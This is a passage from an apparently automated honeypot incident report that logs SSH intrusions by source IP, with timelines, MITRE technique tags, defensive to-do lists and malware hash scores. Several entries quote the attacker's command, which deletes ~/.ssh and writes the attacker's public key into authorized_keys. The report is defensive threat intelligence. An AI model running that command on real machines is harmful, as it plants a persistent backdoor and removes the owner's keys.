| `2026-06-05 22:59:24` | `cowrie.login.success` |
| `2026-06-05 22:59:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2a29823e71d

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:01 |
| **Last Seen** | 2026-06-05 23:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:01:11` | `cowrie.session.connect` |
| `2026-06-05 23:01:11` | `cowrie.client.version` |
| `2026-06-05 23:01:11` | `cowrie.client.kex` |
| `2026-06-05 23:01:12` | `cowrie.login.success` |
| `2026-06-05 23:01:12` | `cowrie.session.params` |
| `2026-06-05 23:01:12` | `cowrie.command.input` |
| `2026-06-05 23:01:12` | `cowrie.command.failed` |
| `2026-06-05 23:01:13` | `cowrie.log.closed` |
| `2026-06-05 23:01:13` | `cowrie.session.params` |
| `2026-06-05 23:01:13` | `cowrie.command.input` |
| `2026-06-05 23:01:13` | `cowrie.session.file_download` |
| `2026-06-05 23:01:13` | `cowrie.log.closed` |
| `2026-06-05 23:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a147d804eca8

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:01 |
| **Last Seen** | 2026-06-05 23:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:01:15` | `cowrie.session.connect` |
| `2026-06-05 23:01:15` | `cowrie.client.version` |
| `2026-06-05 23:01:15` | `cowrie.client.kex` |
| `2026-06-05 23:01:16` | `cowrie.login.success` |
| `2026-06-05 23:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-806a189a095d

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:02 |
| **Last Seen** | 2026-06-05 23:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:02:59` | `cowrie.session.connect` |
| `2026-06-05 23:02:59` | `cowrie.client.version` |
| `2026-06-05 23:02:59` | `cowrie.client.kex` |
| `2026-06-05 23:03:00` | `cowrie.login.success` |
| `2026-06-05 23:03:00` | `cowrie.session.params` |
| `2026-06-05 23:03:00` | `cowrie.command.input` |
| `2026-06-05 23:03:00` | `cowrie.command.failed` |
| `2026-06-05 23:03:01` | `cowrie.log.closed` |
| `2026-06-05 23:03:01` | `cowrie.session.params` |
| `2026-06-05 23:03:01` | `cowrie.command.input` |
| `2026-06-05 23:03:01` | `cowrie.session.file_download` |
| `2026-06-05 23:03:01` | `cowrie.log.closed` |
| `2026-06-05 23:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1d9720af9dc

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:03 |
| **Last Seen** | 2026-06-05 23:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:03:03` | `cowrie.session.connect` |
| `2026-06-05 23:03:03` | `cowrie.client.version` |
| `2026-06-05 23:03:03` | `cowrie.client.kex` |
| `2026-06-05 23:03:04` | `cowrie.login.success` |
| `2026-06-05 23:03:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43274ba25a84

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:04 |
| **Last Seen** | 2026-06-05 23:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:04:49` | `cowrie.session.connect` |
| `2026-06-05 23:04:49` | `cowrie.client.version` |
| `2026-06-05 23:04:49` | `cowrie.client.kex` |
| `2026-06-05 23:04:50` | `cowrie.login.success` |
| `2026-06-05 23:04:50` | `cowrie.session.params` |
| `2026-06-05 23:04:50` | `cowrie.command.input` |
| `2026-06-05 23:04:50` | `cowrie.command.failed` |
| `2026-06-05 23:04:50` | `cowrie.log.closed` |
| `2026-06-05 23:04:50` | `cowrie.session.params` |
| `2026-06-05 23:04:50` | `cowrie.command.input` |
| `2026-06-05 23:04:51` | `cowrie.session.file_download` |
| `2026-06-05 23:04:51` | `cowrie.log.closed` |
| `2026-06-05 23:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-169252b09078

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:04 |
| **Last Seen** | 2026-06-05 23:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:04:53` | `cowrie.session.connect` |
| `2026-06-05 23:04:53` | `cowrie.client.version` |
| `2026-06-05 23:04:53` | `cowrie.client.kex` |
| `2026-06-05 23:04:53` | `cowrie.login.success` |
| `2026-06-05 23:04:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-661488247a81

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 23:05 |
| **Last Seen** | 2026-06-05 23:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:05:28` | `cowrie.session.connect` |
| `2026-06-05 23:05:28` | `cowrie.client.version` |
| `2026-06-05 23:05:29` | `cowrie.client.kex` |
| `2026-06-05 23:05:29` | `cowrie.login.success` |
| `2026-06-05 23:05:29` | `cowrie.session.params` |
| `2026-06-05 23:05:29` | `cowrie.command.input` |
| `2026-06-05 23:05:29` | `cowrie.command.failed` |
| `2026-06-05 23:05:29` | `cowrie.log.closed` |
| `2026-06-05 23:05:29` | `cowrie.session.params` |
| `2026-06-05 23:05:29` | `cowrie.command.input` |
| `2026-06-05 23:05:29` | `cowrie.session.file_download` |
| `2026-06-05 23:05:29` | `cowrie.log.closed` |
| `2026-06-05 23:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-837cc1b988c6

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 23:05 |
| **Last Seen** | 2026-06-05 23:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:05:31` | `cowrie.session.connect` |
| `2026-06-05 23:05:31` | `cowrie.client.version` |
| `2026-06-05 23:05:31` | `cowrie.client.kex` |
| `2026-06-05 23:05:31` | `cowrie.login.success` |
| `2026-06-05 23:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ef77a2c12d2

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 23:07 |
| **Last Seen** | 2026-06-05 23:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:07:38` | `cowrie.session.connect` |
| `2026-06-05 23:07:38` | `cowrie.client.version` |
| `2026-06-05 23:07:38` | `cowrie.client.kex` |
| `2026-06-05 23:07:38` | `cowrie.login.success` |
| `2026-06-05 23:07:38` | `cowrie.session.params` |
| `2026-06-05 23:07:38` | `cowrie.command.input` |
| `2026-06-05 23:07:38` | `cowrie.command.failed` |
| `2026-06-05 23:07:38` | `cowrie.log.closed` |
| `2026-06-05 23:07:38` | `cowrie.session.params` |
| `2026-06-05 23:07:38` | `cowrie.command.input` |
| `2026-06-05 23:07:38` | `cowrie.session.file_download` |
| `2026-06-05 23:07:38` | `cowrie.log.closed` |
| `2026-06-05 23:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922e8ef50291

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 23:07 |
| **Last Seen** | 2026-06-05 23:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:07:40` | `cowrie.session.connect` |
| `2026-06-05 23:07:40` | `cowrie.client.version` |
| `2026-06-05 23:07:40` | `cowrie.client.kex` |
| `2026-06-05 23:07:40` | `cowrie.login.success` |
| `2026-06-05 23:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32785baf0b57

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 23:09 |
| **Last Seen** | 2026-06-05 23:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:09:42` | `cowrie.session.connect` |
| `2026-06-05 23:09:42` | `cowrie.client.version` |
| `2026-06-05 23:09:42` | `cowrie.client.kex` |
| `2026-06-05 23:09:43` | `cowrie.login.success` |
| `2026-06-05 23:09:43` | `cowrie.session.params` |
| `2026-06-05 23:09:43` | `cowrie.command.input` |
| `2026-06-05 23:09:43` | `cowrie.command.failed` |
| `2026-06-05 23:09:43` | `cowrie.log.closed` |
| `2026-06-05 23:09:43` | `cowrie.session.params` |
| `2026-06-05 23:09:43` | `cowrie.command.input` |
| `2026-06-05 23:09:43` | `cowrie.session.file_download` |
| `2026-06-05 23:09:43` | `cowrie.log.closed` |
| `2026-06-05 23:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f290d35f5800

| Field | Detail |
|---|---|
| **Source IP** | `203.121.40[.]210` |
| **First Seen** | 2026-06-05 23:09 |
| **Last Seen** | 2026-06-05 23:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:09:45` | `cowrie.session.connect` |
| `2026-06-05 23:09:45` | `cowrie.client.version` |
| `2026-06-05 23:09:45` | `cowrie.client.kex` |
| `2026-06-05 23:09:45` | `cowrie.login.success` |
| `2026-06-05 23:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.121.40[.]210` to AbuseIPDB if not already reported
- [ ] Block `203.121.40[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3261237c9fa4

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:10 |
| **Last Seen** | 2026-06-05 23:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:10:32` | `cowrie.session.connect` |
| `2026-06-05 23:10:32` | `cowrie.client.version` |
| `2026-06-05 23:10:32` | `cowrie.client.kex` |
| `2026-06-05 23:10:33` | `cowrie.login.success` |
| `2026-06-05 23:10:33` | `cowrie.session.params` |
| `2026-06-05 23:10:33` | `cowrie.command.input` |
| `2026-06-05 23:10:33` | `cowrie.command.failed` |
| `2026-06-05 23:10:34` | `cowrie.log.closed` |
| `2026-06-05 23:10:34` | `cowrie.session.params` |
| `2026-06-05 23:10:34` | `cowrie.command.input` |
| `2026-06-05 23:10:34` | `cowrie.session.file_download` |
| `2026-06-05 23:10:34` | `cowrie.log.closed` |
| `2026-06-05 23:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb430d19f77e

| Field | Detail |
|---|---|
| **Source IP** | `45.120.216[.]232` |
| **First Seen** | 2026-06-05 23:10 |
| **Last Seen** | 2026-06-05 23:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-05 23:10:36` | `cowrie.session.connect` |
| `2026-06-05 23:10:36` | `cowrie.client.version` |
| `2026-06-05 23:10:36` | `cowrie.client.kex` |
| `2026-06-05 23:10:37` | `cowrie.login.success` |
| `2026-06-05 23:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.120.216[.]232` to AbuseIPDB if not already reported
- [ ] Block `45.120.216[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `202.152.201[.]166` | **25** | 2026-06-05 22:42 | 2026-06-05 22:55 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `45.120.216[.]232` | **13** | 2026-06-05 22:43 | 2026-06-05 23:12 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `203.121.40[.]210` | **12** | 2026-06-05 22:41 | 2026-06-05 23:11 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `160.187.180[.]175` | **2** | 2026-06-05 21:58 | 2026-06-05 22:07 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `114.216.2[.]84` | 1 | 2026-06-05 22:48 | 2026-06-05 22:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.240.95[.]27` | 1 | 2026-06-05 22:38 | 2026-06-05 22:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.175[.]122` | 1 | 2026-06-05 22:17 | 2026-06-05 22:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.137.131[.]78` | 1 | 2026-06-05 22:54 | 2026-06-05 22:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `183.250.89[.]44` | 1 | 2026-06-05 21:56 | 2026-06-05 21:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.103.222[.]120` | 1 | 2026-06-05 22:10 | 2026-06-05 22:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.224.126[.]107` | 1 | 2026-06-05 22:29 | 2026-06-05 22:31 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
